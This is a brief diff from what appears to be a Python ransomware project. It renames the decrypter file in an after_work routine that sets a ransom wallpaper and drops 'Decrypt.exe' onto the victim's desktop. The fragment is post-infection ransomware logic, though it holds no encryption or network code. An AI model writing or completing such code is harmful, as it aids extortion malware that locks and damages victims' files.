@@ -88,7 +88,7 @@ def after_work():
     for jpgfile in glob.iglob(os.path.join(src_dir, "*.jpg")):
         shutil.copy(jpgfile, dst_dir)
     ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}\\background.png', 3)
-    src_dir = os.getcwd()+'/DeRansomware.exe'
+    src_dir = os.getcwd()+'/decrypter.exe'
     dst_dir = r"C:/Users/"+User+"/Desktop/Decrypt.exe"
     shutil.copy(src_dir, dst_dir)
         
